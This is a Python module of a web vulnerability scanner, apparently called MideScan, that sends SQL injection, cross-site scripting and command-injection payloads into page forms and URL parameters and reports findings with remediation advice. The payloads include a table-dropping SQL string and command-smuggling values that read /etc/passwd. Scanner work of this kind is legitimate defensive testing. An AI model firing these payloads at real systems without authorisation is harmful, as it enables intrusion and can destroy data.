# MideScan v1.0 — by Cybermide
# Module: A03 — Injection

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

def get_forms(url, session):
    """Extract all forms from a page"""
    forms = []
    try:
        resp = session.get(url, timeout=5, verify=False)
        soup = BeautifulSoup(resp.text, 'html.parser')
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', url),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            for inp in form.find_all(['input', 'textarea', 'select']):
                form_data['inputs'].append({
                    'name': inp.get('name', ''),
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value', 'test')
                })
            forms.append(form_data)
    except:
        pass
    return forms


def inject_url_params(url, payload, session):
    """Inject payload into URL parameters"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    responses = []
    for key in params:
        modified = params.copy()
        modified[key] = [payload]
        new_query = urlencode(modified, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        try:
            resp = session.get(new_url, timeout=5, verify=False)
            responses.append({'url': new_url, 'param': key, 'response': resp})
        except:
            pass
    return responses


def inject_form(form, payload, target, session):
    """Inject payload into form fields"""
    action = form['action']
    if not action.startswith('http'):
        action = urljoin(target, action)
    data = {}
    for inp in form['inputs']:
        if inp['name']:
            if inp['type'] in ['text', 'search', 'email', 'password', 'textarea']:
                data[inp['name']] = payload
            else:
                data[inp['name']] = inp['value'] or 'test'
    try:
        if form['method'] == 'post':
            resp = session.post(action, data=data, timeout=5, verify=False)
        else:
            resp = session.get(action, params=data, timeout=5, verify=False)
        return {'action': action, 'data': data, 'response': resp}
    except:
        return None


def scan(target, session, found_pages=[], verbose=True):
    results = []

    if verbose:
        print("\n  [*] A03 — Checking Injection vulnerabilities...")

    # ================================================
    # SQL INJECTION
    # ================================================
    if verbose:
        print("  [*] Testing SQL Injection...")

    sql_payloads = [
        ("' OR '1'='1", ['sql syntax', 'mysql', 'ora-', 'sql server',
                          'postgresql', 'sqlite', 'syntax error',
                          'unclosed quotation', 'quoted string']),
        ("' OR '1'='1'--", ['sql syntax', 'mysql', 'error']),
        ("1' ORDER BY 1--", ['sql syntax', 'mysql', 'error']),
        ("' UNION SELECT NULL--", ['sql syntax', 'mysql', 'error', 'union']),
        ("'; DROP TABLE users--", ['sql syntax', 'mysql', 'error']),
    ]

    pages_to_test = [target] + found_pages[:10]

    for page in pages_to_test:
        forms = get_forms(page, session)
        for payload, error_signs in sql_payloads:
            # Test URL params
            url_responses = inject_url_params(page, payload, session)
            for r in url_responses:
                body = r['response'].text.lower()
                for sign in error_signs:
                    if sign in body:
                        results.append({
                            'owasp': 'A03 — Injection',
                            'severity': 'CRITICAL',
                            'status': 'VULNERABLE',
                            'title': 'SQL Injection detected in URL parameter',
                            'evidence': (
                                f"URL: {r['url']}\n"
                                f"  Parameter: {r['param']}\n"
                                f"  Payload: {payload}\n"
                                f"  Error detected: '{sign}' found in server response"
                            ),
                            'details': f"SQL injection payload triggered a database error in parameter '{r['param']}' — attacker can read, modify or delete database content",
                            'recommendation': 'Use parameterised queries or prepared statements — never concatenate user input into SQL queries'
                        })
                        if verbose:
                            print(f"  [!] CRITICAL: SQL Injection in {r['url']} param={r['param']}")
                        break

            # Test forms
            for form in forms:
                result = inject_form(form, payload, page, session)
                if result:
                    body = result['response'].text.lower()
                    for sign in error_signs:
                        if sign in body:
                            results.append({
                                'owasp': 'A03 — Injection',
                                'severity': 'CRITICAL',
                                'status': 'VULNERABLE',
                                'title': 'SQL Injection detected in form field',
                                'evidence': (
                                    f"Form action: {result['action']}\n"
                                    f"  Method: {form['method'].upper()}\n"
                                    f"  Payload: {payload}\n"
                                    f"  Fields tested: {list(result['data'].keys())}\n"
                                    f"  Error detected: '{sign}' found in server response"
                                ),
                                'details': f"SQL injection payload in form triggered a database error — attacker can extract full database contents",
                                'recommendation': 'Use parameterised queries — validate and sanitise all form inputs server-side'
                            })
                            if verbose:
                                print(f"  [!] CRITICAL: SQL Injection in form at {result['action']}")
                            break

    # ================================================
    # XSS CROSS SITE SCRIPTING
    # ================================================
    if verbose:
        print("  [*] Testing Cross-Site Scripting (XSS)...")

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ]

    for page in pages_to_test:
        forms = get_forms(page, session)
        for payload in xss_payloads:
            # Test URL params
            url_responses = inject_url_params(page, payload, session)
            for r in url_responses:
                if payload in r['response'].text:
                    results.append({
                        'owasp': 'A03 — Injection',
                        'severity': 'HIGH',
                        'status': 'VULNERABLE',
                        'title': 'Reflected XSS detected in URL parameter',
                        'evidence': (
                            f"URL: {r['url']}\n"
                            f"  Parameter: {r['param']}\n"
                            f"  Payload: {payload}\n"
                            f"  Result: Payload reflected unescaped in server response"
                        ),
                        'details': f"XSS payload reflected in parameter '{r['param']}' — attacker can steal cookies, hijack sessions or redirect users",
                        'recommendation': 'Encode all output — use Content-Security-Policy headers — validate and sanitise all inputs'
                    })
                    if verbose:
                        print(f"  [!] HIGH: XSS in {r['url']} param={r['param']}")

            # Test forms
            for form in forms:
                result = inject_form(form, payload, page, session)
                if result and payload in result['response'].text:
                    results.append({
                        'owasp': 'A03 — Injection',
                        'severity': 'HIGH',
                        'status': 'VULNERABLE',
                        'title': 'Reflected XSS detected in form field',
                        'evidence': (
                            f"Form action: {result['action']}\n"
                            f"  Method: {form['method'].upper()}\n"
                            f"  Payload: {payload}\n"
                            f"  Fields tested: {list(result['data'].keys())}\n"
                            f"  Result: Payload reflected unescaped in response"
                        ),
                        'details': 'XSS payload reflected from form input — attacker can execute malicious scripts in victims browser',
                        'recommendation': 'Sanitise all user inputs — encode HTML output — implement strict Content-Security-Policy'
                    })
                    if verbose:
                        print(f"  [!] HIGH: XSS in form at {result['action']}")

    # ================================================
    # COMMAND INJECTION
    # ================================================
    if verbose:
        print("  [*] Testing Command Injection...")

    cmd_payloads = [
        ("; ls", ['root', 'bin', 'etc', 'usr', 'var']),
        ("| whoami", ['root', 'admin', 'www-data', 'apache']),
        ("&& cat /etc/passwd", ['root:x:', 'daemon:', 'bin:']),
        ("; dir", ['volume', 'directory', 'file(s)']),
        ("| dir", ['volume', 'directory', 'file(s)']),
    ]

    for page in pages_to_test:
        forms = get_forms(page, session)
        for payload, signs in cmd_payloads:
            url_responses = inject_url_params(page, payload, session)
            for r in url_responses:
                body = r['response'].text.lower()
                for sign in signs:
                    if sign in body:
                        results.append({
                            'owasp': 'A03 — Injection',
                            'severity': 'CRITICAL',
                            'status': 'VULNERABLE',
                            'title': 'Command Injection detected',
                            'evidence': (
                                f"URL: {r['url']}\n"
                                f"  Parameter: {r['param']}\n"
                                f"  Payload: {payload}\n"
                                f"  System output detected: '{sign}' found in response"
                            ),
                            'details': f"Command injection payload triggered system output — attacker can execute arbitrary commands on the server",
                            'recommendation': 'Never pass user input to system commands — use safe APIs — implement strict input validation'
                        })
                        if verbose:
                            print(f"  [!] CRITICAL: Command Injection in {r['url']}")
                        break

    if not results:
        results.append({
            'owasp': 'A03 — Injection',
            'severity': 'INFO',
            'status': 'SAFE',
            'title': 'No injection vulnerabilities detected',
            'evidence': 'SQL, XSS and command injection payloads did not trigger vulnerable responses',
            'details': 'Basic injection checks passed — manual testing recommended for complete coverage',
            'recommendation': 'Implement parameterised queries, output encoding and input validation as defence in depth'
        })
        if verbose:
            print("  [+] No injection vulnerabilities detected")

    return results
